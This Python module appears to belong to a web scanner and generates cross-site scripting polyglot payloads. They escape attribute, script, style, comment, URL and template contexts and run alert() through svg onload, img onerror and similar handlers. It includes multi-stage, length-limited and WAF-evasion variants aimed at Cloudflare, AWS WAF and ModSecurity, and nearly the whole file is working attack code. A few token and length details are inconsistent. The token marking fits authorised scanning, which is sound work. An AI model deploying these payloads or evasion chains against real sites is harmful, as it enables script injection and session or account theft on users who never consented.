"""Polyglot XSS payload generator.

A polyglot payload executes in MULTIPLE contexts simultaneously:
  * HTML body (reflected)
  * HTML attribute value
  * JavaScript string literal
  * JavaScript code context
  * URL parameter
  * CSS string

This module generates polyglots PROGRAMMATICALLY (not just a static list)
so they can be customized per-target (token, alert message, attribute
context).  This is what distinguishes a great scanner from a list-runner:
the polyglot is tailored to the reflection context.

Polyglot construction principles:
  1. Break out of any quoted string with `</script>` or `</style>` (in case
     the reflection is inside a <script> or <style> block).
  2. Break out of any attribute with `">` or `'>`.
  3. Trigger an event handler that doesn't depend on `<script>` (since
     CSP often blocks inline <script>).
  4. Use a token so the verifier can confirm execution (not just reflection).
  5. Stay parseable as URL parameter / JSON string / XML attribute.
"""
from __future__ import annotations
import re
from urllib.parse import quote

# Marker regex used by the verifier to confirm execution.
POLYGLOT_TOKEN_RE = re.compile(r"alert\('xss_poly_([a-z0-9]+)'\)")


def make_token() -> str:
    """Generate a unique 8-char hex token for this polyglot."""
    import secrets
    return secrets.token_hex(4)


def build_polyglot(token: str | None = None,
                   alert_msg: str | None = None) -> str:
    """Build a single high-yield polyglot payload.

    The payload is designed to:
      - Escape any quote/attr context (`"`, `'`).
      - Escape <script>/<style> string contexts.
      - Trigger onerror onload oninput onfocus events (multiple sinks).
      - Survive URL encoding (no chars that break URLs unencoded).
      - Be token-marked so the verifier can confirm execution.
    """
    tok = token or make_token()
    msg = alert_msg or f"xss_poly_{tok}"
    # The polyglot.  Components:
    #   </script> -- break out of <script> string context
    #   </style>  -- break out of <style> string context
    #   " and '   -- break out of any quoted attribute
    #   >         -- close the current tag
    #   <svg/onload=alert('msg')>  -- SVG onload (no <script> needed)
    #   <img src=x onerror=alert('msg')>  -- classic onerror
    #   <input onfocus=alert('msg') autofocus>  -- focus-based
    #   javascript:alert('msg')//  -- URL context (href, src)
    poly = (
        "</script>"
        "</style>"
        '">'
        "'>"
        ">"
        f"<svg/onload=alert('{msg}')>"
        f"<img src=x onerror=alert('{msg}')>"
        f"<input onfocus=alert('{msg}') autofocus>"
        f"javascript:alert('{msg}')//"
    )
    return poly


def build_minimal_polyglot(token: str | None = None) -> str:
    """A short polyglot for length-limited reflection points.

    Useful when the server truncates input at, e.g., 50 chars.
    """
    tok = token or make_token()
    msg = f"xp_{tok}"
    # ~70 chars; fits most reflection points.
    return f"'\"><svg/onload=alert('{msg}')>"


def build_url_safe_polyglot(token: str | None = None) -> str:
    """A polyglot that survives URL encoding round-trip.

    The payload uses only chars that survive urlencode() losslessly,
    so it works even when the server URL-decodes before reflecting.
    """
    tok = token or make_token()
    msg = f"xp_{tok}"
    # Avoid `"` (becomes %22, fine but ugly) and use single quotes only.
    poly = (
        "%3C%2Fscript%3E%27%3E%3Csvg%2Fonload%3Dalert%28%27"
        + msg
        + "%27%29%3E"
    )
    return poly


def build_attribute_context_polyglot(token: str | None = None) -> str:
    """Polyglot optimized for reflection inside an HTML attribute value.

    The payload assumes the reflection is between quotes in an attribute
    like <input value="REFLECTION">.  It closes the attribute, the tag,
    and adds an event handler.
    """
    tok = token or make_token()
    msg = f"xp_{tok}"
    return f"' onmouseover='alert(\"{msg}\")' x='"


def build_js_string_polyglot(token: str | None = None) -> str:
    """Polyglot for reflection inside a JS string literal.

    Assumes reflection is inside `var x = 'REFLECTION';` or `"REFLECTION"`.
    Breaks out of the string, closes the script, and adds a new SVG onload.
    """
    tok = token or make_token()
    msg = f"xp_{tok}"
    return f"';</script><svg/onload=alert('{msg}')>"


def build_css_context_polyglot(token: str | None = None) -> str:
    """Polyglot for reflection inside a CSS string/context.

    Assumes reflection is inside <style>...REFLECTION...</style> or
    `style="...REFLECTION..."`.  Closes the CSS and adds an SVG onload.
    """
    tok = token or make_token()
    msg = f"xp_{tok}"
    return f"</style><svg/onload=alert('{msg}')>"


def all_polyglots(token: str | None = None) -> dict[str, str]:
    """Return a dict of all polyglot variants for the given token."""
    return {
        "generic":    build_polyglot(token),
        "minimal":    build_minimal_polyglot(token),
        "url_safe":   build_url_safe_polyglot(token),
        "attribute":  build_attribute_context_polyglot(token),
        "js_string":  build_js_string_polyglot(token),
        "css":        build_css_context_polyglot(token),
    }


# ---------------------------------------------------------------------------
# Phase 13a: Multi-stage / context-aware / WAF-evading polyglots
# ---------------------------------------------------------------------------

# Reflection-context tags.  These map the context name returned by
# ``context._analyze_at`` to the "stage 1" break-out sequence that closes the
# surrounding context before injecting the executable payload.  A multi-stage
# polyglot concatenates several of these break-outs so it survives whichever
# context the server happened to put it in.
_CONTEXT_BREAKOUTS: dict[str, list[str]] = {
    "html_element":      [""],  # already in HTML body; no break-out needed
    "html_attribute_dq": ['"', ">"],
    "html_attribute_sq": ["'", ">"],
    "html_comment":      ["-->", ">"],
    "script_block":      ["</script>"],
    "script_string_dq":  ['"</script>'],
    "script_string_sq":  ["'</script>"],
    "script_string_bt":  ["`</script>"],
    "style_block":       ["</style>"],
    "style_string_dq":   ['"</style>'],
    "style_string_sq":   ["'</style>"],
    "url_href":          ["javascript:", "//"],
    "url_javascript":    ["", ";"],
    "meta_refresh":      [";url=javascript:", "//"],
    "cdata":             ["]]>"],
    "svg_context":       [">"],
    "math_context":      [">"],
    "template_angular":  ["}}", "{{"],
    "template_vue":      ["}}", "{{"],
    "event_handler":     ["", ";"],
    "css":               ["</style>", ">"],
}


# High-yield execution primitives that don't depend on <script>.  Each entry
# is (primitive, why_it_works).  These are the "stage 2" executors.
_EXEC_PRIMITIVES: list[tuple[str, str]] = [
    ("<svg/onload=alert('{msg}')>", "SVG onload -- no <script> needed, fires on parse"),
    ("<img src=x onerror=alert('{msg}')>", "classic onerror -- works in any HTML context"),
    ("<body onload=alert('{msg}')>", "body onload -- fires on document parse"),
    ("<input onfocus=alert('{msg}') autofocus>", "autofocus trigger -- no user interaction"),
    ("<details open ontoggle=alert('{msg}')>", "details ontoggle -- fires on parse when open"),
    ("<video src=x onerror=alert('{msg}')>", "video onerror -- media element sink"),
    ("<audio src=x onerror=alert('{msg}')>", "audio onerror -- media element sink"),
    ("<marquee onstart=alert('{msg}')>", "marquee onstart -- legacy but still fires"),
    ("<svg><animate onbegin=alert('{msg}') attributeName=x dur=1s>",
     "SVG animate onbegin -- SMIL event sink"),
]


def build_multi_stage_polyglot(token: str | None = None,
                               contexts: list[str] | None = None,
                               max_stages: int = 4) -> str:
    """Build a multi-stage polyglot that breaks out of MULTIPLE contexts.

    The payload is constructed as a sequence of context-break-outs followed
    by an execution primitive.  This dramatically raises yield versus a
    single-stage polyglot: when the server reflects the input into an
    unknown context, ONE of the break-outs will close it and the executor
    that follows will run.

    Args:
        token: optional token; auto-generated if None.
        contexts: restrict break-outs to these context names; if None, a
                  representative spread (HTML attr, script, style, comment)
                  is used so the payload stays under ~400 chars.
        max_stages: cap on the number of break-out stages to keep the
                    payload length reasonable.

    Returns: a polyglot payload string.
    """
    tok = token or make_token()
    msg = f"xss_poly_{tok}"
    if contexts is None:
        # Pick a representative spread: HTML attr, script, style, comment.
        # These are the most common reflection contexts in real apps.
        contexts = ["html_attribute_dq", "script_string_dq",
                    "style_block", "html_comment"]
    seen: set[str] = set()
    parts: list[str] = []
    for ctx in contexts:
        if ctx in seen:
            continue
        seen.add(ctx)
        breakouts = _CONTEXT_BREAKOUTS.get(ctx, [""])
        parts.extend(breakouts)
        if len(parts) >= max_stages * 2:
            break
    # Append one executor (rotating choice for variety).
    idx = (sum(ord(c) for c in tok) % len(_EXEC_PRIMITIVES)) if tok else 0
    primitive, _ = _EXEC_PRIMITIVES[idx]
    parts.append(primitive.format(msg=msg))
    return "".join(parts)


def build_context_aware_polyglot(context: str,
                                 token: str | None = None) -> str:
    """Build a polyglot tuned for a SPECIFIC detected reflection context.

    Uses the context name returned by ``context._analyze_at`` (e.g.
    ``html_attribute_dq``, ``script_string_sq``) to pick the precise
    break-out + executor.  This is more reliable than the generic polyglot
    because it doesn't waste characters on break-outs that don't apply.
    """
    tok = token or make_token()
    msg = f"xss_poly_{tok}"
    breakouts = _CONTEXT_BREAKOUTS.get(context, [""])
    # Pick an executor that fits the context.  For URL contexts we use a
    # javascript: URI; for everything else we use an event-handler tag.
    if context in ("url_href", "url_javascript", "meta_refresh"):
        return "".join(breakouts) + f"javascript:alert('{msg}')//"
    if context in ("script_block", "script_string_dq", "script_string_sq",
                   "script_string_bt"):
        # In a script context we need to close the script first, then inject.
        return "".join(breakouts) + f"<svg/onload=alert('{msg}')>"
    if context in ("style_block", "style_string_dq", "style_string_sq", "css"):
        return "".join(breakouts) + f"<svg/onload=alert('{msg}')>"
    if context == "html_comment":
        return "".join(breakouts) + f"<svg/onload=alert('{msg}')>"
    if context in ("html_attribute_dq", "html_attribute_sq"):
        # Close the attribute + tag, then inject.
        return "".join(breakouts) + f"<svg/onload=alert('{msg}')>"
    if context == "cdata":
        return "".join(breakouts) + f"<svg/onload=alert('{msg}')>"
    if context in ("svg_context", "math_context"):
        return "".join(breakouts) + f"<svg/onload=alert('{msg}')>"
    if context in ("template_angular", "template_vue"):
        # Break out of {{ }} then inject.
        return "".join(breakouts) + f"<svg/onload=alert('{msg}')>"
    # Default: HTML element context.
    return f"<svg/onload=alert('{msg}')>"


def build_waf_evasion_polyglot(token: str | None = None,
                               waf_name: str | None = None) -> str:
    """Build a polyglot pre-transformed to evade a known WAF.

    Combines a multi-stage polyglot with a WAF-specific bypass chain from
    ``bypass.py``.  If no WAF is named, applies a generic high-yield chain
    (HTML entity + mixed case + comment break).
    """
    tok = token or make_token()
    base = build_multi_stage_polyglot(tok)
    try:
        from . import bypass as bypass_mod
        chains = bypass_mod.chains_for_waf(waf_name)
        if chains:
            _, _, chain, _ = chains[0]
            return bypass_mod.apply_chain(base, chain)
    except Exception:
        pass
    # Fallback: apply a generic chain inline.
    try:
        from . import transform as t
        out = base
        for step in ("html_entity_named", "mixed_case", "comment_break"):
            out = t.apply(step, out)
        return out
    except Exception:
        return base


def build_length_limited_polyglot(max_len: int = 80,
                                  token: str | None = None) -> str:
    """Build the shortest polyglot that fits within ``max_len`` chars.

    Useful for reflection points with tight length limits (e.g. 50, 80,
    100 chars).  Iteratively tries shorter break-out combos until one fits.
    """
    tok = token or make_token()
    msg = f"xp_{tok}"
    # Try executors from shortest to longest.
    candidates = [
        f"'\"><svg/onload=alert('{msg}')>",
        f"'\"><img src=x onerror=alert('{msg}')>",
        f"'\"><svg onload=alert('{msg}')>",
        f"'\"><body onload=alert('{msg}')>",
    ]
    for c in candidates:
        if len(c) <= max_len:
            return c
    # Truncate the message if even the shortest doesn't fit.
    short_msg = tok[:4]
    return f"'\"><svg/onload=alert('{short_msg}')>"[:max_len]


def all_polyglots_v2(token: str | None = None) -> dict[str, str]:
    """Return a dict of all Phase 13 polyglot variants for the given token.

    This complements ``all_polyglots`` (which returns the Phase 1 variants)
    with the new multi-stage / context-aware / WAF-evading / length-limited
    variants.
    """
    return {
        "multi_stage":         build_multi_stage_polyglot(token),
        "ctx_aware_html_attr": build_context_aware_polyglot("html_attribute_dq", token),
        "ctx_aware_script":    build_context_aware_polyglot("script_string_dq", token),
        "ctx_aware_style":     build_context_aware_polyglot("style_block", token),
        "ctx_aware_url":       build_context_aware_polyglot("url_href", token),
        "ctx_aware_comment":   build_context_aware_polyglot("html_comment", token),
        "waf_generic":         build_waf_evasion_polyglot(token, None),
        "waf_cloudflare":      build_waf_evasion_polyglot(token, "cloudflare"),
        "waf_aws":             build_waf_evasion_polyglot(token, "aws_waf"),
        "waf_modsec":          build_waf_evasion_polyglot(token, "modsecurity"),
        "len_50":              build_length_limited_polyglot(50, token),
        "len_80":              build_length_limited_polyglot(80, token),
    }


def extract_token(payload: str) -> str | None:
    """Extract the polyglot token from a payload string."""
    m = POLYGLOT_TOKEN_RE.search(payload or "")
    return m.group(1) if m else None


def is_polyglot(payload: str) -> bool:
    """Whether a payload looks like one of our polyglots."""
    return POLYGLOT_TOKEN_RE.search(payload or "") is not None
